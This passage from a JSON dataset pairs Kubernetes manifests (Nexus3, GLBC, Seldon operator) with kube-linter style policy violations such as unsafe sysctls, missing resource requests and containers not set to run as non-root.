name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_synack_retries\"."
  },
  {
    "id": "2188",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_syncookies\"."
  },
  {
    "id": "2189",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_tw_reuse\"."
  },
  {
    "id": "2190",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.unix.max_dgram_qlen\"."
  },
  {
    "id": "2191",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"volume-mount-uid\" has cpu request 0"
  },
  {
    "id": "2192",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"volume-mount-uid\" has memory limit 0"
  },
  {
    "id": "2193",
    "manifest_path": "data/manifests/the_stack_sample/sample_0534.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: asp\nspec:\n  selector:\n    app: asp\n  type: LoadBalancer\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:asp])"
  },
  {
    "id": "2194",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"l7-lb-controller\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "2195",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"default-http-backend\" does not have a read-only root file system"
  },
  {
    "id": "2196",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"l7-lb-controller\" does not have a read-only root file system"
  },
  {
    "id": "2197",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"default-http-backend\" is not set to runAsNonRoot"
  },
  {
    "id": "2198",
    "manifest_path": "data/manifests/the_stack_sample/sample_0535.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: l7-lb-controller\n  namespace: kube-system\n  labels:\n    k8s-app: glbc\n    version: v0.5.1\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: GLBC\nspec:\n  replicas: 1\n  selector:\n    k8s-app: glbc\n    version: v0.5.1\n  template:\n    metadata:\n      labels:\n        k8s-app: glbc\n        version: v0.5.1\n        name: glbc\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - name: default-http-backend\n        image: gcr.io/google_containers/defaultbackend:1.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n        ports:\n        - containerPort: 8080\n        resources:\n          limits:\n            cpu: 10m\n            memory: 20Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - image: gcr.io/google_containers/glbc:0.5.1\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          periodSeconds: 30\n          timeoutSeconds: 5\n        name: l7-lb-controller\n        resources:\n          limits:\n            cpu: 100m\n            memory: 100Mi\n          requests:\n            cpu: 100m\n            memory: 50Mi\n        args:\n        - --default-backend-service=kube-system/default-http-backend\n        - --sync-period=300s\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"l7-lb-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "2199",
    "manifest_path": "data/manifests/the_stack_sample/sample_0536.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: seldon\n    app.kubernetes.io/component: seldon\n    app.kubernetes.io/instance: seldon-core\n    app.kubernetes.io/name: seldon-core-operator\n    app.kubernetes.io/version: 1.4.0\n    control-plane: seldon-controller-manager\n  name: seldon-controller-manager\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: seldon\n      app.kubernetes.io/component: seldon\n      app.kubernetes.io/instance: seldon1\n      app.kubernetes.io/name: seldon-core-operator\n      app.kubernetes.io/version: v0.5\n      control-plane: seldon-controller-manager\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: seldon\n        app.kubernetes.io/component: seldon\n        app.kubernetes.io/instance: seldon1\n        app.kubernetes.io/name: seldon-core-operator\n        app.kubernetes.io/version: v0.5\n        control-plane: seldon-controller-manager\n    spec:\n      containers:\n      - args:\n        - --enable-leader-election\n        - --webhook-port=8443\n        - --create-resources=$(MANAGER_CREATE_RESOURCES)\n        - ''\n        command:\n        - /manager\n        env:\n        - name: WATCH_NAMESPACE\n          value: ''\n        - name: RELATED_IMAGE_EXECUTOR\n          value: ''\n        - name: RELATED_IMAGE_ENGINE\n          value: ''\n        - name: RELATED_IMAGE_STORAGE_INITIALIZER\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_SKLEARNSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_XGBOOSTSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_REST\n          value: ''\n        - name: RELATED_IMAGE_MLFLOWSERVER_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_REST\n          value: ''\n        - name: RELATED_IMAGE_TFPROXY_GRPC\n          value: ''\n        - name: RELATED_IMAGE_TENSORFLOW\n          value: ''\n        - name: RELATED_IMAGE_EXPLAINER\n          value: ''\n        - name: RELATED_IMAGE_MOCK_CLASSIFIER\n          value: ''\n        - name: MANAGER_CREATE_RESOURCES\n          value: 'false'\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONTROLLER_ID\n          value: ''\n        - name: AMBASSADOR_ENABLED\n          value: 'true'\n        - name: AMBASSADOR_SINGLE_NAMESPACE\n          value: 'false'\n        - name: ENGINE_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/engine:1.4.0\n        - name: ENGINE_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: ENGINE_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: ENGINE_CONTAINER_USER\n          value: '8888'\n        - name: ENGINE_LOG_MESSAGES_EXTERNALLY\n          value: 'false'\n        - name: PREDICTIVE_UNIT_SERVICE_PORT\n          value: '9000'\n        - name: PREDICTIVE_UNIT_DEFAULT_ENV_SECRET_REF_NAME\n          value: ''\n        - name: PREDICTIVE_UNIT_METRICS_PORT_NAME\n          value: metrics\n        - name: ENGINE_SERVER_GRPC_PORT\n          value: '5001'\n        - name: ENGINE_SERVER_PORT\n          value: '8000'\n        - name: ENGINE_PROMETHEUS_PATH\n          value: /prometheus\n        - name: ISTIO_ENABLED\n          value: 'true'\n        - name: KEDA_ENABLED\n          value: 'false'\n        - name: ISTIO_GATEWAY\n          value: kubeflow/kubeflow-gateway\n        - name: ISTIO_TLS_MODE\n          value: ''\n        - name: USE_EXECUTOR\n          value: 'true'\n        - name: EXECUTOR_CONTAINER_IMAGE_AND_VERSION\n          value: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-executor:1.4.0\n        - name: EXECUTOR_CONTAINER_IMAGE_PULL_POLICY\n          value: IfNotPresent\n        - name: EXECUTOR_PROMETHEUS_PATH\n          value: /prometheus\n        - name: EXECUTOR_SERVER_PORT\n          value: '8000'\n        - name: EXECUTOR_CONTAINER_USER\n          value: '8888'\n        - name: EXECUTOR_CONTAINER_SERVICE_ACCOUNT_NAME\n          value: default\n        - name: EXECUTOR_SERVER_METRICS_PORT_NAME\n          value: metrics\n        - name: EXECUTOR_REQUEST_LOGGER_DEFAULT_ENDPOINT\n          value: http://default-broker\n        - name: DEFAULT_USER_ID\n          value: '8888'\n        - name: EXECUTOR_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: EXECUTOR_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: EXECUTOR_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_REQUEST\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_REQUEST\n          value: 512Mi\n        - name: ENGINE_DEFAULT_CPU_LIMIT\n          value: 500m\n        - name: ENGINE_DEFAULT_MEMORY_LIMIT\n          value: 512Mi\n        image: uhub.service.ucloud.cn/a4x-kubeflow/seldonio/seldon-core-operator:1.4.0\n        imagePullPolicy: IfNotPresent\n        name: manager\n        ports:\n        - containerPort: 8443\n          name: webhook-server\n          protocol: TCP\n        - containerPort: 8080\n          name: metrics\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 300Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - mountPath: /tmp/k8s-webhook-server/serving-certs\n          name: cert\n          readOnly: true\n      serviceAccountName: seldon-manager\n      volumes:\n      - name: cert\n        secret:\n          defaultMode: 420\n          secretName: seldon-webhook-server-cert\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"manager\" does not have a read-only root file system"
  },
  {
    "id": "2200",
    "manifest_path": "data/manifests/the_stack_sample/sample_0536.yaml",
